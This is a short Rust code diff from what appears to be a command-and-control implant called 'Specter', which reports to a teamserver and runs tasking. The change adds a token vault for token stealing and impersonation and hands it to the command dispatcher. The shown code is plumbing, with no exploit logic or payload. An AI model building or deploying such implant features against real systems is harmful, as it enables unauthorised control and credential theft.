@@ -13,6 +13,7 @@ use crate::error::SpecterError;
 use crate::protocol::{
     AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack, parse_tasking_response,
 };
+use crate::token::TokenVault;
 use crate::transport::HttpTransport;
 
 /// Running state of a Specter agent session.
@@ -28,6 +29,8 @@ pub struct SpecterAgent {
     /// Both encrypt (send) and decrypt (recv) operations use and advance this
     /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
     ctr_offset: u64,
+    /// Token vault for impersonation/steal/make operations.
+    token_vault: TokenVault,
 }
 
 impl SpecterAgent {
@@ -51,7 +54,15 @@ impl SpecterAgent {
             "agent initialized"
         );
 
-        Ok(Self { agent_id, raw_crypto, session_crypto, config, transport, ctr_offset: 0 })
+        Ok(Self {
+            agent_id,
+            raw_crypto,
+            session_crypto,
+            config,
+            transport,
+            ctr_offset: 0,
+            token_vault: TokenVault::new(),
+        })
     }
 
     /// Collect metadata about the current host environment.
@@ -168,7 +179,7 @@ impl SpecterAgent {
             };
 
             for package in &message.packages {
-                let result = dispatch::dispatch(package, &mut self.config);
+                let result = dispatch::dispatch(package, &mut self.config, &mut self.token_vault);
                 if self.handle_dispatch_result(package.request_id, result).await {
                     // Exit requested — terminate.
                     return Ok(());
